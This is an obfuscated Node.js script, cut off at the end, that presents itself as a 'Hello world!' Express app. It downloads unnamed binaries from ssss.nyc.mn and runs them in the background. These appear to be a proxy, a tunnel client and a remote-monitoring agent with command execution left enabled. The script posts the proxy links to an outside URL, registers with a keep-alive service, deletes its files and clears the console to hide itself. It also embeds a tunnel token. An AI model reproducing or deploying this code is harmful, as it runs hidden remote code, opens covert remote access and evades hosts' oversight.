const _0x1880f1=_0xcfee;(function(_0x22eec7,_0x2391a1){const _0x16249e=_0xcfee,_0x1b9ad3=_0x22eec7();while(!![]){try{const _0x19007f=parseInt(_0x16249e(0x1f6))/0x1+-parseInt(_0x16249e(0x19e))/0x2+-parseInt(_0x16249e(0x1a4))/0x3+parseInt(_0x16249e(0x199))/0x4*(parseInt(_0x16249e(0x1ab))/0x5)+-parseInt(_0x16249e(0x1be))/0x6*(-parseInt(_0x16249e(0x1ca))/0x7)+parseInt(_0x16249e(0x186))/0x8+-parseInt(_0x16249e(0x19a))/0x9;if(_0x19007f===_0x2391a1)break;else _0x1b9ad3['push'](_0x1b9ad3['shift']());}catch(_0xa11e74){_0x1b9ad3['push'](_0x1b9ad3['shift']());}}}(_0xdd40,0x3d12c));const express=require('express'),app=express(),axios=require(_0x1880f1(0x20e)),os=require('os'),fs=require('fs'),path=require(_0x1880f1(0x17a)),{promisify}=require(_0x1880f1(0x1cc)),exec=promisify(require('child_process')[_0x1880f1(0x174)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x1880f1(0x210)][_0x1880f1(0x201)]||'',PROJECT_URL=process[_0x1880f1(0x210)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x1880f1(0x210)][_0x1880f1(0x1d5)]||![],FILE_PATH=process[_0x1880f1(0x210)]['FILE_PATH']||_0x1880f1(0x1e7),SUB_PATH=process['env'][_0x1880f1(0x1a8)]||_0x1880f1(0x20f),PORT=process[_0x1880f1(0x210)]['SERVER_PORT']||process[_0x1880f1(0x210)][_0x1880f1(0x1d3)]||0xbb8,UUID=process[_0x1880f1(0x210)]['UUID']||_0x1880f1(0x1a9),NEZHA_SERVER=process[_0x1880f1(0x210)][_0x1880f1(0x16b)]||'',NEZHA_PORT=process['env'][_0x1880f1(0x1fa)]||'',NEZHA_KEY=process[_0x1880f1(0x210)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x1880f1(0x210)][_0x1880f1(0x206)]||_0x1880f1(0x18f),ARGO_AUTH=process[_0x1880f1(0x210)][_0x1880f1(0x1b4)]||_0x1880f1(0x216),ARGO_PORT=process[_0x1880f1(0x210)][_0x1880f1(0x1c8)]||0x4dad,CFIP=process['env'][_0x1880f1(0x183)]||'cdns.doon.eu.org',CFPORT=process[_0x1880f1(0x210)]['CFPORT']||0x1bb,NAME=process['env'][_0x1880f1(0x1bb)]||_0x1880f1(0x214);!fs[_0x1880f1(0x170)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x1880f1(0x21a)](FILE_PATH+_0x1880f1(0x1b3))):console[_0x1880f1(0x21a)](FILE_PATH+_0x1880f1(0x190));function generateRandomName(){const _0x41a17b=_0x1880f1,_0x33f5fc='abcdefghijklmnopqrstuvwxyz';let _0x36cb60='';for(let _0x4e1a1c=0x0;_0x4e1a1c<0x6;_0x4e1a1c++){_0x36cb60+=_0x33f5fc['charAt'](Math[_0x41a17b(0x1af)](Math[_0x41a17b(0x17f)]()*_0x33f5fc[_0x41a17b(0x215)]));}return _0x36cb60;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1880f1(0x1c4)](FILE_PATH,npmName),phpPath=path[_0x1880f1(0x1c4)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x1880f1(0x1c4)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x1880f1(0x202)),listPath=path[_0x1880f1(0x1c4)](FILE_PATH,'list.txt'),bootLogPath=path[_0x1880f1(0x1c4)](FILE_PATH,'boot.log'),configPath=path[_0x1880f1(0x1c4)](FILE_PATH,_0x1880f1(0x20a));function deleteNodes(){const _0x406b4c=_0x1880f1;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x788231;try{_0x788231=fs[_0x406b4c(0x193)](subPath,'utf-8');}catch{return null;}const _0x44809b=Buffer[_0x406b4c(0x194)](_0x788231,_0x406b4c(0x1fb))[_0x406b4c(0x196)]('utf-8'),_0x460a82=_0x44809b[_0x406b4c(0x1c0)]('\x0a')[_0x406b4c(0x195)](_0x184164=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x406b4c(0x16f)](_0x184164));if(_0x460a82[_0x406b4c(0x215)]===0x0)return;return axios[_0x406b4c(0x17b)](UPLOAD_URL+_0x406b4c(0x16d),JSON[_0x406b4c(0x21d)]({'nodes':_0x460a82}),{'headers':{'Content-Type':_0x406b4c(0x16c)}})[_0x406b4c(0x1fc)](_0x5755bf=>{return null;}),null;}catch(_0xa5a3d7){return null;}}function _0xdd40(){const _0x115b98=['\x20>/dev/null\x202>&1\x20&','config.yaml','https://amd64.ssss.nyc.mn/bot','8443','/config.json\x20>/dev/null\x202>&1\x20&','PORT','clear','AUTO_ACCESS','writeFileSync','Subscription\x20uploaded\x20successfully','mkdirSync','&path=%2Fvless-argo%3Fed%3D2560#','firefox','https://arm64.ssss.nyc.mn/bot','\x20>\x20nul\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','freedom','\x20successfully','Error\x20executing\x20command:\x20','\x0aclient_secret:\x20','blackhole','win32','Empowerment\x20failed\x20for\x20','ArgoDomain:','./tmp','\x0a\x0atrojan://','\x20-c\x20','utf-8','data','Download\x20','unlink','\x20-c\x20\x22','rm\x20-rf\x20','arch','set','fileUrl','NEZHA\x20variable\x20is\x20empty,skip\x20running','.exe\x20>\x20nul\x202>&1','/dev/null','157394vuzxuf','automatic\x20access\x20task\x20added\x20successfully','none','\x20is\x20running','NEZHA_PORT','base64','catch','tls','\x22\x20>\x20/dev/null\x202>&1','false','match','UPLOAD_URL','sub.txt','\x0a\x20\x20tunnel:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','push','ARGO_DOMAIN','boot.log','https://amd64.ssss.nyc.mn/v1','unlinkSync','config.json','countryCode','listen','https://ipapi.co/json/','axios','sub','env','2053','127.0.0.1','\x20-p\x20','lfhk','length','eyJhIjoiNWY3ZGY2NGYxY2UwYzY1ZmQ3MjVjZjY0ZjM1ZTQ1MWYiLCJ0IjoiZGEyNzAxZTQtZDY5Ni00YTM1LWJlMjYtNTY4YzVhOWRiN2FhIiwicyI6Ik1XUTNOV0V4WVRBdE1EZzJPQzAwT1dJekxXRmtNRE10T0dJeVl6UmlaRFZtWkRoayJ9','\x0a\x20\x20\x20\x20','App\x20is\x20running','npm\x20running\x20error:\x20','log','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','http','stringify','https://arm64.ssss.nyc.mn/web','2087','/api/add-nodes','response','substring','quic','then','isFile','Nodes\x20uploaded\x20successfully','Error\x20reading\x20boot.log:','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','NEZHA_SERVER','application/json','/api/delete-nodes','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','test','existsSync','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','tunnel.json','/vmess-argo?ed=2560','exec','trojan','Add\x20automatic\x20access\x20task\x20faild:\x20','/vless-argo','taskkill\x20/f\x20/im\x20','/tunnel.yml\x20run','path','post','map','/vmess-argo','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','random','https://arm64.ssss.nyc.mn/agent','--tls','http\x20server\x20is\x20running\x20on\x20port:','CFIP','get','includes','2929184VADBzQ','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Error\x20downloading\x20files:','charAt','createWriteStream','chmod','message','nohup\x20','error','hk.xix.de5.net','\x20already\x20exists','&fp=firefox&type=ws&host=','TunnelSecret','readFileSync','from','filter','toString','443','ARGO_DOMAIN:','553780qbIdyx','1032732NUdzdI','Error\x20in\x20startserver:','xtls-rprx-vision','\x0a\x0avmess://','795376NVZgCp','Unhandled\x20error\x20in\x20startserver:','https://oooo.serv00.net/add-url','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','1171443GBbJND','2083','status','pipe','SUB_PATH','1c07e2f8-aa88-4ebb-a9d1-2a2d85910181','finish','5FSjfbs','pkill\x20-f\x20\x22[','https://amd64.ssss.nyc.mn/web','\x0a\x20\x20credentials-file:\x20','floor','https://amd64.ssss.nyc.mn/agent','country_code','arm','\x20is\x20created','ARGO_AUTH','readdirSync','fileName','\x20failed:\x20','org','/trojan-argo','tcp','NAME','platform','block','12oywCub','amd','split','https://arm64.ssss.nyc.mn/v1','vless','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','join','forEach','http://ip-api.com/json/','arm64','ARGO_PORT','success','1718801NMKILE','php\x20running\x20error:\x20','util','basename'];_0xdd40=function(){return _0x115b98;};return _0xdd40();}function cleanupOldFiles(){const _0x222b97=_0x1880f1;try{const _0xadc959=fs[_0x222b97(0x1b5)](FILE_PATH);_0xadc959[_0x222b97(0x1c5)](_0x22136f=>{const _0xb9f3b6=_0x222b97,_0x30dd9b=path[_0xb9f3b6(0x1c4)](FILE_PATH,_0x22136f);try{const _0x507301=fs['statSync'](_0x30dd9b);_0x507301[_0xb9f3b6(0x167)]()&&fs[_0xb9f3b6(0x209)](_0x30dd9b);}catch(_0x9928f0){}});}catch(_0x288269){}}app['get']('/',function(_0x3b8c8d,_0x1384ce){_0x1384ce['send']('Hello\x20world!');});async function generateConfig(){const _0x3b5fe5=_0x1880f1,_0x4f651a={'log':{'access':_0x3b5fe5(0x1f5),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3b5fe5(0x1c2),'settings':{'clients':[{'id':UUID,'flow':_0x3b5fe5(0x19c)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x3b5fe5(0x177),'dest':0xbba},{'path':_0x3b5fe5(0x17d),'dest':0xbbb},{'path':_0x3b5fe5(0x1b9),'dest':0xbbc}]},'streamSettings':{'network':_0x3b5fe5(0x1ba)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x3b5fe5(0x1c2),'settings':{'clients':[{'id':UUID}],'decryption':_0x3b5fe5(0x1f8)},'streamSettings':{'network':_0x3b5fe5(0x1ba),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x3b5fe5(0x1c2),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3b5fe5(0x1f8)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3b5fe5(0x177)}},'sniffing':{'enabled':!![],'destOverride':[_0x3b5fe5(0x21c),_0x3b5fe5(0x1fd),_0x3b5fe5(0x165)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3b5fe5(0x212),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3b5fe5(0x17d)}},'sniffing':{'enabled':!![],'destOverride':[_0x3b5fe5(0x21c),_0x3b5fe5(0x1fd),_0x3b5fe5(0x165)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3b5fe5(0x212),'protocol':_0x3b5fe5(0x175),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3b5fe5(0x1f8),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x3b5fe5(0x21c),_0x3b5fe5(0x1fd),_0x3b5fe5(0x165)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x3b5fe5(0x1df),'tag':'direct'},{'protocol':_0x3b5fe5(0x1e3),'tag':_0x3b5fe5(0x1bd)}]};fs[_0x3b5fe5(0x1d6)](path['join'](FILE_PATH,_0x3b5fe5(0x20a)),JSON[_0x3b5fe5(0x21d)](_0x4f651a,null,0x2));}function _0xcfee(_0x174128,_0x4ec742){_0x174128=_0x174128-0x164;const _0xdd400a=_0xdd40();let _0xcfee4b=_0xdd400a[_0x174128];return _0xcfee4b;}function getSystemArchitecture(){const _0x29561c=_0x1880f1,_0x585271=os[_0x29561c(0x1f0)]();return _0x585271===_0x29561c(0x1b2)||_0x585271===_0x29561c(0x1c7)||_0x585271==='aarch64'?_0x29561c(0x1b2):_0x29561c(0x1bf);}function downloadFile(_0x4860e9,_0x41b3a4,_0x1c6b22){const _0x1eb26f=_0x1880f1,_0x53b0d3=_0x4860e9;!fs[_0x1eb26f(0x170)](FILE_PATH)&&fs[_0x1eb26f(0x1d8)](FILE_PATH,{'recursive':!![]});const _0x9c2229=fs[_0x1eb26f(0x18a)](_0x53b0d3);axios({'method':_0x1eb26f(0x184),'url':_0x41b3a4,'responseType':'stream'})[_0x1eb26f(0x166)](_0x30d6ff=>{const _0x193e0b=_0x1eb26f;_0x30d6ff[_0x193e0b(0x1eb)][_0x193e0b(0x1a7)](_0x9c2229),_0x9c2229['on'](_0x193e0b(0x1aa),()=>{const _0x3de4d1=_0x193e0b;_0x9c2229['close'](),console['log'](_0x3de4d1(0x1ec)+path[_0x3de4d1(0x1cd)](_0x53b0d3)+_0x3de4d1(0x1e0)),_0x1c6b22(null,_0x53b0d3);}),_0x9c2229['on']('error',_0x46a4a4=>{const _0x3ab748=_0x193e0b;fs[_0x3ab748(0x1ed)](_0x53b0d3,()=>{});const _0x318b4d=_0x3ab748(0x1ec)+path[_0x3ab748(0x1cd)](_0x53b0d3)+_0x3ab748(0x1b7)+_0x46a4a4[_0x3ab748(0x18c)];console[_0x3ab748(0x18e)](_0x318b4d),_0x1c6b22(_0x318b4d);});})[_0x1eb26f(0x1fc)](_0x4b4894=>{const _0x25198d=_0x1eb26f,_0x127fc8=_0x25198d(0x1ec)+path[_0x25198d(0x1cd)](_0x53b0d3)+_0x25198d(0x1b7)+_0x4b4894[_0x25198d(0x18c)];console[_0x25198d(0x18e)](_0x127fc8),_0x1c6b22(_0x127fc8);});}async function downloadFilesAndRun(){const _0x169973=_0x1880f1,_0x265ef2=getSystemArchitecture(),_0x174a08=getFilesForArchitecture(_0x265ef2);if(_0x174a08[_0x169973(0x215)]===0x0){console[_0x169973(0x21a)](_0x169973(0x1de));return;}const _0x13bfb7=_0x174a08[_0x169973(0x17c)](_0x38ea38=>{return new Promise((_0x2e6e9a,_0x458124)=>{const _0x297b08=_0xcfee;downloadFile(_0x38ea38[_0x297b08(0x1b6)],_0x38ea38[_0x297b08(0x1f2)],(_0x5b0a8d,_0x43bb70)=>{_0x5b0a8d?_0x458124(_0x5b0a8d):_0x2e6e9a(_0x43bb70);});});});try{await Promise['all'](_0x13bfb7);}catch(_0x5cbf52){console[_0x169973(0x18e)](_0x169973(0x188),_0x5cbf52);return;}function _0x2cbec6(_0x309eff){const _0x5ea0b2=_0x169973,_0x3358c4=0x1fd;_0x309eff[_0x5ea0b2(0x1c5)](_0x4c3fb7=>{const _0x4b486f=_0x5ea0b2;fs[_0x4b486f(0x170)](_0x4c3fb7)&&fs[_0x4b486f(0x18b)](_0x4c3fb7,_0x3358c4,_0x14e753=>{const _0x578f6c=_0x4b486f;_0x14e753?console[_0x578f6c(0x18e)](_0x578f6c(0x1e5)+_0x4c3fb7+':\x20'+_0x14e753):console['log']('Empowerment\x20success\x20for\x20'+_0x4c3fb7+':\x20'+_0x3358c4['toString'](0x8));});});}const _0x26bde7=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2cbec6(_0x26bde7);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2dcc35=NEZHA_SERVER[_0x169973(0x185)](':')?NEZHA_SERVER[_0x169973(0x1c0)](':')['pop']():'',_0x1bb465=new Set([_0x169973(0x197),_0x169973(0x1d1),'2096',_0x169973(0x21f),_0x169973(0x1a5),'2053']),_0x554f25=_0x1bb465['has'](_0x2dcc35)?'true':_0x169973(0x1ff),_0x57fb7e=_0x169973(0x1e2)+NEZHA_KEY+_0x169973(0x1a1)+NEZHA_SERVER+_0x169973(0x204)+_0x554f25+_0x169973(0x1c3)+UUID;fs[_0x169973(0x1d6)](path[_0x169973(0x1c4)](FILE_PATH,_0x169973(0x1cf)),_0x57fb7e);const _0x25a3c0=_0x169973(0x18d)+phpPath+_0x169973(0x1ee)+FILE_PATH+_0x169973(0x16a);try{await exec(_0x25a3c0),console['log'](phpName+_0x169973(0x1f9)),await new Promise(_0x3cbea8=>setTimeout(_0x3cbea8,0x3e8));}catch(_0x3ce46d){console[_0x169973(0x18e)](_0x169973(0x1cb)+_0x3ce46d);}}else{let _0xa2f48d='';const _0x445cc8=[_0x169973(0x197),'8443','2096','2087',_0x169973(0x1a5),_0x169973(0x211)];_0x445cc8[_0x169973(0x185)](NEZHA_PORT)&&(_0xa2f48d=_0x169973(0x181));const _0x4714ea=_0x169973(0x18d)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x169973(0x213)+NEZHA_KEY+'\x20'+_0xa2f48d+_0x169973(0x21b);try{await exec(_0x4714ea),console[_0x169973(0x21a)](npmName+_0x169973(0x1f9)),await new Promise(_0x5597aa=>setTimeout(_0x5597aa,0x3e8));}catch(_0x1a4028){console[_0x169973(0x18e)](_0x169973(0x219)+_0x1a4028);}}}else console['log'](_0x169973(0x1f3));const _0x38ee63='nohup\x20'+webPath+_0x169973(0x1e9)+FILE_PATH+_0x169973(0x1d2);try{await exec(_0x38ee63),console['log'](webName+_0x169973(0x1f9)),await new Promise(_0x50221a=>setTimeout(_0x50221a,0x3e8));}catch(_0x4cee2a){console[_0x169973(0x18e)]('web\x20running\x20error:\x20'+_0x4cee2a);}if(fs[_0x169973(0x170)](botPath)){let _0xa0aff1;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0xa0aff1='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x169973(0x200)](/TunnelSecret/)?_0xa0aff1='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x169973(0x179):_0xa0aff1='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x169973(0x17e)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0xa0aff1+_0x169973(0x1ce)),console['log'](botName+_0x169973(0x1f9)),await new Promise(_0x17e341=>setTimeout(_0x17e341,0x7d0));}catch(_0x1b3ad3){console[_0x169973(0x18e)](_0x169973(0x1e1)+_0x1b3ad3);}}await new Promise(_0x82eeba=>setTimeout(_0x82eeba,0x1388));}function getFilesForArchitecture(_0x44a8d3){const _0x4b0612=_0x1880f1;let _0x2dd38e;_0x44a8d3==='arm'?_0x2dd38e=[{'fileName':webPath,'fileUrl':_0x4b0612(0x21e)},{'fileName':botPath,'fileUrl':_0x4b0612(0x1db)}]:_0x2dd38e=[{'fileName':webPath,'fileUrl':_0x4b0612(0x1ad)},{'fileName':botPath,'fileUrl':_0x4b0612(0x1d0)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3bd002=_0x44a8d3==='arm'?_0x4b0612(0x180):_0x4b0612(0x1b0);_0x2dd38e['unshift']({'fileName':npmPath,'fileUrl':_0x3bd002});}else{const _0x307ef8=_0x44a8d3===_0x4b0612(0x1b2)?_0x4b0612(0x1c1):_0x4b0612(0x208);_0x2dd38e['unshift']({'fileName':phpPath,'fileUrl':_0x307ef8});}}return _0x2dd38e;}function argoType(){const _0x20771e=_0x1880f1;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x20771e(0x21a)](_0x20771e(0x1a3));return;}if(ARGO_AUTH[_0x20771e(0x185)](_0x20771e(0x192))){fs[_0x20771e(0x1d6)](path[_0x20771e(0x1c4)](FILE_PATH,_0x20771e(0x172)),ARGO_AUTH);const _0x5dd425=_0x20771e(0x203)+ARGO_AUTH[_0x20771e(0x1c0)]('\x22')[0xb]+_0x20771e(0x1ae)+path[_0x20771e(0x1c4)](FILE_PATH,_0x20771e(0x172))+_0x20771e(0x171)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x20771e(0x16e);fs[_0x20771e(0x1d6)](path['join'](FILE_PATH,'tunnel.yml'),_0x5dd425);}else console[_0x20771e(0x21a)](_0x20771e(0x187));}async function extractDomains(){const _0x1fbc99=_0x1880f1;let _0x4046a7;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4046a7=ARGO_DOMAIN,console[_0x1fbc99(0x21a)](_0x1fbc99(0x198),_0x4046a7),await _0x14f027(_0x4046a7);else try{const _0x489d6e=fs['readFileSync'](path[_0x1fbc99(0x1c4)](FILE_PATH,_0x1fbc99(0x207)),_0x1fbc99(0x1ea)),_0x133da6=_0x489d6e[_0x1fbc99(0x1c0)]('\x0a'),_0x9c090=[];_0x133da6[_0x1fbc99(0x1c5)](_0x4c0d89=>{const _0x5a0a2a=_0x1fbc99,_0x114499=_0x4c0d89[_0x5a0a2a(0x200)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x114499){const _0x179257=_0x114499[0x1];_0x9c090['push'](_0x179257);}});if(_0x9c090[_0x1fbc99(0x215)]>0x0)_0x4046a7=_0x9c090[0x0],console[_0x1fbc99(0x21a)](_0x1fbc99(0x1e6),_0x4046a7),await _0x14f027(_0x4046a7);else{console[_0x1fbc99(0x21a)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x1fbc99(0x1c4)](FILE_PATH,_0x1fbc99(0x207)));async function _0x4a3cf7(){const _0x4e1914=_0x1fbc99;try{process[_0x4e1914(0x1bc)]===_0x4e1914(0x1e4)?await exec(_0x4e1914(0x178)+botName+_0x4e1914(0x1f4)):await exec(_0x4e1914(0x1ac)+botName[_0x4e1914(0x189)](0x0)+']'+botName[_0x4e1914(0x164)](0x1)+_0x4e1914(0x1fe));}catch(_0x4980b9){}}_0x4a3cf7(),await new Promise(_0x3ccb36=>setTimeout(_0x3ccb36,0xbb8));const _0xc9b409=_0x1fbc99(0x1dd)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0xc9b409+'\x20>/dev/null\x202>&1\x20&'),console[_0x1fbc99(0x21a)](botName+_0x1fbc99(0x1f9)),await new Promise(_0x34372f=>setTimeout(_0x34372f,0xbb8)),await extractDomains();}catch(_0x2bd8f0){console[_0x1fbc99(0x18e)](_0x1fbc99(0x1e1)+_0x2bd8f0);}}}catch(_0x38f06a){console[_0x1fbc99(0x18e)](_0x1fbc99(0x169),_0x38f06a);}async function _0x284571(){const _0x5f3158=_0x1fbc99;try{const _0x5c13c8=await axios[_0x5f3158(0x184)](_0x5f3158(0x20d),{'timeout':0xbb8});if(_0x5c13c8['data']&&_0x5c13c8['data'][_0x5f3158(0x1b1)]&&_0x5c13c8[_0x5f3158(0x1eb)][_0x5f3158(0x1b8)])return _0x5c13c8[_0x5f3158(0x1eb)][_0x5f3158(0x1b1)]+'_'+_0x5c13c8[_0x5f3158(0x1eb)][_0x5f3158(0x1b8)];}catch(_0x1bb5ce){try{const _0x307c93=await axios[_0x5f3158(0x184)](_0x5f3158(0x1c6),{'timeout':0xbb8});if(_0x307c93[_0x5f3158(0x1eb)]&&_0x307c93[_0x5f3158(0x1eb)][_0x5f3158(0x1a6)]===_0x5f3158(0x1c9)&&_0x307c93[_0x5f3158(0x1eb)][_0x5f3158(0x20b)]&&_0x307c93[_0x5f3158(0x1eb)][_0x5f3158(0x1b8)])return _0x307c93[_0x5f3158(0x1eb)]['countryCode']+'_'+_0x307c93['data'][_0x5f3158(0x1b8)];}catch(_0x1cacde){}}return'Unknown';}async function _0x14f027(_0x2b332d){const _0x545e41=await _0x284571(),_0x1d73a4=NAME?NAME+'-'+_0x545e41:_0x545e41;return new Promise(_0x17bf11=>{setTimeout(()=>{const _0x29e1c4=_0xcfee,_0x2b9665={'v':'2','ps':''+_0x1d73a4,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x2b332d,'path':_0x29e1c4(0x173),'tls':_0x29e1c4(0x1fd),'sni':_0x2b332d,'alpn':'','fp':_0x29e1c4(0x1da)},_0xeaab3a='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x2b332d+'&fp=firefox&type=ws&host='+_0x2b332d+_0x29e1c4(0x1d9)+_0x1d73a4+_0x29e1c4(0x19d)+Buffer[_0x29e1c4(0x194)](JSON[_0x29e1c4(0x21d)](_0x2b9665))[_0x29e1c4(0x196)](_0x29e1c4(0x1fb))+_0x29e1c4(0x1e8)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x2b332d+_0x29e1c4(0x191)+_0x2b332d+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1d73a4+_0x29e1c4(0x217);console[_0x29e1c4(0x21a)](Buffer[_0x29e1c4(0x194)](_0xeaab3a)[_0x29e1c4(0x196)](_0x29e1c4(0x1fb))),fs[_0x29e1c4(0x1d6)](subPath,Buffer['from'](_0xeaab3a)[_0x29e1c4(0x196)](_0x29e1c4(0x1fb))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x29e1c4(0x184)]('/'+SUB_PATH,(_0x3ee54c,_0x3a0a3e)=>{const _0x2f83a1=_0x29e1c4,_0x116160=Buffer[_0x2f83a1(0x194)](_0xeaab3a)['toString'](_0x2f83a1(0x1fb));_0x3a0a3e[_0x2f83a1(0x1f1)]('Content-Type','text/plain;\x20charset=utf-8'),_0x3a0a3e['send'](_0x116160);}),_0x17bf11(_0xeaab3a);},0x7d0);});}}async function uploadNodes(){const _0x16fbf1=_0x1880f1;if(UPLOAD_URL&&PROJECT_URL){const _0x19cf1d=PROJECT_URL+'/'+SUB_PATH,_0x589bba={'subscription':[_0x19cf1d]};try{const _0x40b1dc=await axios[_0x16fbf1(0x17b)](UPLOAD_URL+'/api/add-subscriptions',_0x589bba,{'headers':{'Content-Type':_0x16fbf1(0x16c)}});return _0x40b1dc&&_0x40b1dc['status']===0xc8?(console[_0x16fbf1(0x21a)](_0x16fbf1(0x1d7)),_0x40b1dc):null;}catch(_0x2a524e){if(_0x2a524e[_0x16fbf1(0x221)]){if(_0x2a524e[_0x16fbf1(0x221)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x16fbf1(0x170)](listPath))return;const _0x2ece7a=fs[_0x16fbf1(0x193)](listPath,_0x16fbf1(0x1ea)),_0x1ef243=_0x2ece7a['split']('\x0a')[_0x16fbf1(0x195)](_0x21836f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x21836f));if(_0x1ef243[_0x16fbf1(0x215)]===0x0)return;const _0x38e7cb=JSON[_0x16fbf1(0x21d)]({'nodes':_0x1ef243});try{const _0x1cc543=await axios[_0x16fbf1(0x17b)](UPLOAD_URL+_0x16fbf1(0x220),_0x38e7cb,{'headers':{'Content-Type':_0x16fbf1(0x16c)}});return _0x1cc543&&_0x1cc543[_0x16fbf1(0x1a6)]===0xc8?(console[_0x16fbf1(0x21a)](_0x16fbf1(0x168)),_0x1cc543):null;}catch(_0x166fd6){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x581f7b=_0xcfee,_0x37e0d1=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x37e0d1['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x37e0d1[_0x581f7b(0x205)](phpPath);process[_0x581f7b(0x1bc)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x37e0d1[_0x581f7b(0x1c4)]('\x20')+_0x581f7b(0x1dc),_0x26390a=>{const _0x112467=_0x581f7b;console[_0x112467(0x1d4)](),console['log'](_0x112467(0x218)),console[_0x112467(0x21a)](_0x112467(0x1a2));}):exec(_0x581f7b(0x1ef)+_0x37e0d1[_0x581f7b(0x1c4)]('\x20')+'\x20>/dev/null\x202>&1',_0x29c2ba=>{const _0x4b72f9=_0x581f7b;console[_0x4b72f9(0x1d4)](),console['log']('App\x20is\x20running'),console[_0x4b72f9(0x21a)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4a69ef=_0x1880f1;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4a69ef(0x21a)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x26d48b=await axios[_0x4a69ef(0x17b)](_0x4a69ef(0x1a0),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4a69ef(0x16c)}});return console['log'](_0x4a69ef(0x1f7)),_0x26d48b;}catch(_0x4aaaf6){return 